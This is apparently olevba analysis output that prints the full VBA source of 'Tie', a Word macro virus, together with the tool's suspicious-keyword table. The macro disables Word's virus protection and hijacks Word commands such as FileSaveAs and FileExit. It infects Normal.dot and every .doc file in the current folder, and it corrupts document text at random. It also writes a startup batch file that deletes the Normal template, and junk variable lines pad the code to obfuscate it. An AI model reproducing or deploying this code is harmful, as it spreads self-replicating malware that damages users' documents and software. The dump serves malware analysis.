olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-35c76424db798b7dcede562d9ce81fcd18c15bfab241040512839d25c0bc332d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-35c76424db798b7dcede562d9ce81fcd18c15bfab241040512839d25c0bc332d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tie.bas 
in file: Virus.MSWord.VMPC-based-35c76424db798b7dcede562d9ce81fcd18c15bfab241040512839d25c0bc332d - OLE stream: 'Macros/VBA/Tie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Tie()
On Error Resume Next
Randomize
f13947 = u11188 & c16791 & k18741 & m11188
f13947 = m11188 & c16791 & Int(Rnd * 8440)
k7710 = m13893 & e8473
f10769 = m13893 & c5414 & Int(Rnd * 9517)
f14113 = u18391 & c9571 & Int(Rnd * 8918)
f14113 = m18391 & c9571 & Int(Rnd * 8931)
f9030 = m9790 & c13181 & Int(Rnd * 3686)
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
f5805 = u3658 & c10258 & Int(Rnd * 5310)
f5805 = m3658 & c10258 & Int(Rnd * 1369)
f9959 = u6025 & c14914 & Int(Rnd * 7114)
f9959 = m6025 & c14914 & Int(Rnd * 151)
f9494 = u7907 & c9049 & Int(Rnd * 2259)
f9494 = m7907 & c9049 & Int(Rnd * 6918)
ActiveDocument.ReadOnlyRecommended = False
k17146 = m10782 & e15156
f17649 = m10782 & c14653 & Int(Rnd * 9143)
f10514 = u5933 & c9229 & Int(Rnd * 2700)
f10514 = m5933 & c9229 & Int(Rnd * 1970)
f3812 = m11591 & c11841 & Int(Rnd * 7988)
k13076 = m10859 & e2411
f9537 = m10859 & c5950 & Int(Rnd * 2111)
f10931 = m5211 & c13549 & Int(Rnd * 1807)
check = Int(Rnd * 100)
If check = 3 Then Call p4047
k6143 = m6586 & e7058
f6466 = m6586 & c6735 & Int(Rnd * 5131)
k11605 = m15537 & e14603
f8907 = m15537 & c17301 & Int(Rnd * 8387)
f9014 = u8559 & c9466 & k5704 & m8559
f9014 = m8559 & c9466 & Int(Rnd * 331)
k7919 = m14387 & e14787
f13645 = m14387 & c9061 & Int(Rnd * 7497)
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "Tie, I Love my kitty!", vbSystemModal
f11276 = m14962 & c8181 & Int(Rnd * 7942)
k14728 = m13576 & e11105
f11050 = m13576 & c14783 & Int(Rnd * 8903)
f7348 = u13982 & c6922 & Int(Rnd * 1162)
f7348 = m13982 & c6922 & Int(Rnd * 8200)
f3408 = u7657 & c6592 & Int(Rnd * 3085)
f3408 = m7657 & c6592 & Int(Rnd * 3305)
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Tie"
    .Execute
End With
k3392 = m3801 & e17658
f11323 = m3801 & c9727 & Int(Rnd * 1337)
f10241 = u15706 & c4286 & Int(Rnd * 1547)
f10241 = m15706 & c4286 & Int(Rnd * 9535)
f10918 = m9867 & c4479 & Int(Rnd * 6653)
k12169 = m18649 & e7920
f12026 = m18649 & c8063 & Int(Rnd * 8762)
s293181568 = 0
f10228 = u10363 & c15213 & Int(Rnd * 8557)
f10228 = m10363 & c15213 & Int(Rnd * 4382)
f16478 = u1931 & c5806 & k12980 & m1931
f16478 = m1931 & c5806 & Int(Rnd * 285)
Set VBtie815629316 = MacroContainer
k15578 = m13474 & e3744
f13347 = m13474 & c5975 & Int(Rnd * 4756)
f17692 = m13734 & c11554 & Int(Rnd * 4336)
k10640 = m11016 & e8259
f6180 = m11016 & c12719 & Int(Rnd * 7543)
f9763 = u2246 & c9347 & Int(Rnd * 3791)
f9763 = m2246 & c9347 & Int(Rnd * 1150)
 f3756$ = "c:\windows\startm~1\programs\startup\msfile.bat"
k12197 = m4806 & e13846
f14633 = m4806 & c11410 & Int(Rnd * 2510)
k6419 = m2911 & e11053
f10407 = m2911 & c7065 & Int(Rnd * 27)
h40478156 = GetAttr(NormalTemplate.FullName)
f10990 = u9393 & c4167 & k4261 & m9393
f10990 = m9393 & c4167 & Int(Rnd * 355)
f11906 = m10284 & c6828 & Int(Rnd * 1666)
If h40478156 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call kitty(f3756$)
k8826 = m6597 & e9278
f11157 = m6597 & c6947 & Int(Rnd * 846)
k4548 = m6181 & e10218
f10169 = m6181 & c4597 & Int(Rnd * 5834)
If h40478156 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call kitty(f3756$)
k7891 = m8232 & e18859
f11038 = m8232 & c15712 & Int(Rnd * 3750)
f11097 = u2415 & c6330 & Int(Rnd * 6711)
f11097 = m2415 & c6330 & Int(Rnd * 2298)
If h40478156 = vbReadOnly Then GoTo Meow
k3450 = m16112 & e9513
f6539 = m16112 & c6424 & Int(Rnd * 8832)
k10670 = m7172 & e4187
f8788 = m7172 & c6069 & Int(Rnd * 1291)
If h40478156 = vbReadOnly + vbArchive Then GoTo Meow
f9943 = m14793 & c11199 & Int(Rnd * 6794)
f7336 = m8638 & c17850 & Int(Rnd * 3047)
f8966 = u9721 & c7920 & Int(Rnd * 7138)
f8966 = m9721 & c7920 & Int(Rnd * 6936)
f4455 = m12257 & c9559 & Int(Rnd * 6865)
If VBtie815629316 = NormalTemplate Then s293181568 = 1
f5895 = u15446 & c8705 & Int(Rnd * 5230)
f5895 = m15446 & c8705 & Int(Rnd * 9955)
k8606 = m12584 & e17136
f12430 = m12584 & c13312 & Int(Rnd * 3446)
If s293181568 = 1 Then not29318 = NormalTemplate.FullName Else not29318 = ActiveDocument.FullName
k4701 = m7420 & e15178
f8443 = m7420 & c11436 & Int(Rnd * 5155)
k14919 = m11434 & e7320
f7169 = m11434 & c15070 & Int(Rnd * 2556)
If s293181568 = 1 Then mnop81562 = ActiveDocument.FullName Else mnop81562 = NormalTemplate.FullName
f8894 = u10193 & c8231 & Int(Rnd * 6723)
f8894 = m10193 & c8231 & Int(Rnd * 3234)
k11729 = m10623 & e13638
f14573 = m10623 & c10794 & Int(Rnd * 3962)
Application.OrganizerCopy Source:=not29318, Destination:=mnop81562, Name:="Tie", Object:=wdOrganizerObjectProjectItems
k11329 = m9213 & e10609
f14966 = m9213 & c6972 & Int(Rnd * 3492)
k13048 = m14703 & e6485
f6931 = m14703 & c12602 & Int(Rnd * 8363)
If s293181568 = 1 And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
f10752 = u12662 & c11697 & Int(Rnd * 768)
f10752 = m12662 & c11697 & Int(Rnd * 6162)
k8855 = m12753 & e5205
f3765 = m12753 & c10295 & Int(Rnd * 4594)
If s293181568 = 0 Then
f10348 = u8729 & c6448 & k5952 & m8729
f10348 = m8729 & c6448 & Int(Rnd * 1479)
k9170 = m5695 & e10452
f15549 = m5695 & c4073 & Int(Rnd * 3820)
     If NormalTemplate.Saved = False Then NormalTemplate.Save
f9658 = m9225 & c7184 & Int(Rnd * 9207)
f10003 = u8977 & c11816 & k9982 & m8977
f10003 = m8977 & c11816 & Int(Rnd * 5343)
     End If
k14575 = m12336 & e6144
f12775 = m12336 & c7944 & Int(Rnd * 9581)
f1217 = u10780 & c17564 & Int(Rnd * 8824)
f1217 = m10780 & c17564 & Int(Rnd * 9394)
f15608 = u9878 & c4690 & Int(Rnd * 6304)
f15608 = m9878 & c4690 & Int(Rnd * 2369)
f13287 = u9292 & c15357 & Int(Rnd * 6408)
f13287 = m9292 & c15357 & Int(Rnd * 6208)
Meow:
End Sub
Sub HelpAbout()
    On Error Resume Next
f12251 = u10036 & c11460 & k7202 & m10036
f12251 = m10036 & c11460 & Int(Rnd * 7801)
k13419 = m9957 & e13586
f13930 = m9957 & c13075 & Int(Rnd * 5085)
    MsgBox "Stop the killing of baby Virii!", vbInformation
f8609 = u14623 & c4217 & Int(Rnd * 2582)
f8609 = m14623 & c4217 & Int(Rnd * 5646)
f5431 = m7331 & c12838 & Int(Rnd * 6724)
End Sub
Sub FileNew()
    On Error Resume Next
f10586 = u15458 & c8917 & Int(Rnd * 3114)
f10586 = m15458 & c8917 & Int(Rnd * 5671)
    Call Tie
k11548 = m3226 & e12750
f13692 = m3226 & c10606 & Int(Rnd * 892)
f10467 = u17092 & c17682 & Int(Rnd * 1842)
f10467 = m17092 & c17682 & Int(Rnd * 8574)
Dialogs(wdDialogFileNew).Show
f14620 = u9461 & c2340 & Int(Rnd * 9328)
f14620 = m9461 & c2340 & Int(Rnd * 7356)
f14156 = u11343 & c6474 & k8454 & m11343
f14156 = m11343 & c6474 & Int(Rnd * 4124)
    Skip = 1
k7671 = m14218 & e6719
f12311 = m14218 & c2079 & Int(Rnd * 6349)
f9372 = u3656 & c13169 & k8511 & m3656
f9372 = m3656 & c13169 & Int(Rnd * 1620)
    Call Tie
k10478 = m9314 & e7973
f12669 = m9314 & c5782 & Int(Rnd * 7638)
End Sub
Sub ToolsOptions()
    On Error Resume Next
k17078 = m4952 & e7477
f16585 = m4952 & c7970 & Int(Rnd * 2228)
f7979 = u9303 & c15568 & Int(Rnd * 6871)
f7979 = m9303 & c15568 & Int(Rnd * 1924)
Dialogs(wdDialogToolsOptions).Show
k14136 = m14308 & e11862
f15323 = m14308 & c10675 & Int(Rnd * 4781)
k5607 = m9630 & e9669
f5954 = m9630 & c9322 & Int(Rnd * 8504)
    Call Tie
f17871 = u16281 & c13406 & Int(Rnd * 9182)
f17871 = m16281 & c13406 & Int(Rnd * 9980)
k11921 = m8480 & e9852
f10693 = m8480 & c11080 & Int(Rnd * 7614)
End Sub
Sub FileSaveAs()
    On Error Resume Next
k11816 = m10634 & e12281
f7693 = m10634 & c16404 & Int(Rnd * 1171)
f7468 = u9246 & c3008 & Int(Rnd * 1356)
f7468 = m9246 & c3008 & Int(Rnd * 2131)
Dialogs(wdDialogFileSaveAs).Show
f13764 = u9652 & c5146 & k8378 & m9652
f13764 = m9652 & c5146 & Int(Rnd * 1428)
f11634 = u6959 & c6736 & Int(Rnd * 5005)
f11634 = m6959 & c6736 & Int(Rnd * 6066)
    Call Tie
f9551 = m13102 & c9871 & Int(Rnd * 4098)
f6658 = m11377 & c12508 & Int(Rnd * 2763)
End Sub
Sub FileExit()
    On Error Resume Next
k13001 = m19167 & e768
f9147 = m19167 & c4622 & Int(Rnd * 9414)
k14223 = m4320 & e10505
f8443 = m4320 & c16285 & Int(Rnd * 1990)
    Call Tie
f16645 = u16032 & c13436 & k17069 & m16032
f16645 = m16032 & c13436 & Int(Rnd * 7609)
f12896 = u7600 & c14029 & Int(Rnd * 4745)
f12896 = m7600 & c14029 & Int(Rnd * 3512)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
k11625 = m12775 & e16066
f11574 = m12775 & c16117 & Int(Rnd * 7517)
f4111 = u9404 & c9778 & k4349 & m9404
f4111 = m9404 & c9778 & Int(Rnd * 7563)
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Tie
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Tie
End If
Loop
    Application.Quit
f14407 = m319 & c2864 & Int(Rnd * 305)
f17990 = u11546 & c9491 & k14156 & m11546
f17990 = m11546 & c9491 & Int(Rnd * 3911)
End Sub
Sub AutoClose()
    On Error Resume Next
k4252 = m10475 & e6433
f1051 = m10475 & c9634 & Int(Rnd * 5737)
k8474 = m8581 & e3640
f6825 = m8581 & c5289 & Int(Rnd * 3254)
    Call Tie
k6316 = m5065 & e13482
f7408 = m5065 & c12390 & Int(Rnd * 3583)
k3288 = m5954 & e10088
f8324 = m5954 & c5052 & Int(Rnd * 4893)
End Sub
Sub ToolsMacro()
    On Error Resume Next
f17573 = m12268 & c5170 & Int(Rnd * 4074)
k10594 = m15481 & e2543
f8396 = m15481 & c4741 & Int(Rnd * 8595)
    Call Tie
k9945 = m13902 & e11446
f7455 = m13902 & c13936 & Int(Rnd * 6977)
f7515 = u8086 & c14552 & Int(Rnd * 5109)
f7515 = m8086 & c14552 & Int(Rnd * 5526)
k5504 = m11783 & e2099
f2956 = m11783 & c4647 & Int(Rnd * 2061)
k12724 = m12843 & e16771
f15204 = m12843 & c14291 & Int(Rnd * 4519)
MsgBox "Word Basic Err =7"
f6360 = u465 & c9422 & k11568 & m465
f6360 = m465 & c9422 & Int(Rnd * 23)
k5533 = m7939 & e8026
f5564 = m7939 & c7995 & Int(Rnd * 5808)
End Sub
Sub FileTemplates()
    On Error Resume Next
f15383 = u5391 & c16142 & k14128 & m5391
f15383 = m5391 & c16142 & Int(Rnd * 164)
f10872 = u7927 & c7782 & k2849 & m7927
f10872 = m7927 & c7782 & Int(Rnd * 93)
    Call Tie
k7194 = m11118 & e2047
f2312 = m11118 & c6929 & Int(Rnd * 3184)
f8848 = m8254 & c11535 & Int(Rnd * 6673)
f4860 = u13091 & c9659 & Int(Rnd * 2534)
f4860 = m13091 & c9659 & Int(Rnd * 8383)
k6975 = m7104 & e9905
f13586 = m7104 & c3294 & Int(Rnd * 5783)
MsgBox "Word Basic Err =7"
f7122 = u9495 & c18374 & Int(Rnd * 5412)
f7122 = m9495 & c18374 & Int(Rnd * 5995)
f10991 = u16292 & c9017 & Int(Rnd * 3973)
f10991 = m16292 & c9017 & Int(Rnd * 7189)
End Sub
Sub ViewVBCode()
    On Error Resume Next
k7376 = m8514 & e12934
f13194 = m8514 & c7116 & Int(Rnd * 6253)
k9095 = m4005 & e8808
f15157 = m4005 & c2746 & Int(Rnd * 1125)
    Call Tie
k4444 = m18332 & e12647
f7170 = m18332 & c9921 & Int(Rnd * 9389)
f10182 = m8423 & c18518 & Int(Rnd * 7821)
f6765 = u14398 & c4672 & Int(Rnd * 3306)
f6765 = m14398 & c4672 & Int(Rnd * 4706)
MsgBox "Word Basic Err =7"
k11224 = m11366 & e13038
f11966 = m11366 & c12296 & Int(Rnd * 7048)
k6067 = m4895 & e5415
f6075 = m4895 & c5407 & Int(Rnd * 2435)
End Sub
Sub p4047()
    On Error Resume Next
k12036 = m14646 & e14422
f16419 = m14646 & c10039 & Int(Rnd * 8570)
f9194 = m8006 & c16167 & Int(Rnd * 2809)
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "t"
            .Replacement.Text = "Tie"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
f7634 = u6451 & c15787 & k11349 & m6451
f7634 = m6451 & c15787 & Int(Rnd * 2622)
f2027 = u15548 & c2914 & Int(Rnd * 1470)
f2027 = m15548 & c2914 & Int(Rnd * 5596)
End Sub
    
Sub kitty(strFile As String)
    
Dim hFile As Long
On Error Resume Next
f1516 = u18592 & c5501 & k1159 & m18592
f1516 = m18592 & c5501 & Int(Rnd * 8969)
f8669 = u5706 & c9684 & Int(Rnd * 4077)
f8669 = m5706 & c9684 & Int(Rnd * 1029)
n$ = NormalTemplate
k15474 = m15627 & e6172
f10348 = m15627 & c11298 & Int(Rnd * 8312)
f6837 = u13925 & c14360 & Int(Rnd * 6486)
f6837 = m13925 & c14360 & Int(Rnd * 8407)
Part11$ = "attrib -h -r "
k10288 = m13000 & e2621
f1848 = m13000 & c11061 & Int(Rnd * 9951)
f7003 = u11129 & c7140 & k9877 & m11129
f7003 = m11129 & c7140 & Int(Rnd * 8898)
snag$ = "c:\progra~1\micros~1\templa~1\"
k17594 = m12527 & e5075
f11919 = m12527 & c10750 & Int(Rnd * 3653)
f16883 = u2765 & c15905 & Int(Rnd * 9399)
f16883 = m2765 & c15905 & Int(Rnd * 1803)
snag1$ = "c:\progra~1\micros~2\templa~1\"
f11038 = u5131 & c10563 & Int(Rnd * 1204)
f11038 = m5131 & c10563 & Int(Rnd * 584)
f12384 = u10644 & c6617 & Int(Rnd * 6027)
f12384 = m10644 & c6617 & Int(Rnd * 6885)
Part2$ = "del "
k9725 = m9889 & e9304
f8728 = m9889 & c10301 & Int(Rnd * 9577)
k10566 = m9325 & e6616
f5790 = m9325 & c11392 & Int(Rnd * 4847)
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
f9087 = u4986 & c14004 & Int(Rnd * 3202)
f9087 = m4986 & c14004 & Int(Rnd * 867)
k13125 = m14252 & e9800
f4813 = m14252 & c18112 & Int(Rnd * 4989)
f4396 = u14973 & c13792 & k9849 & m14973
f4396 = m14973 & c13792 & Int(Rnd * 5151)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

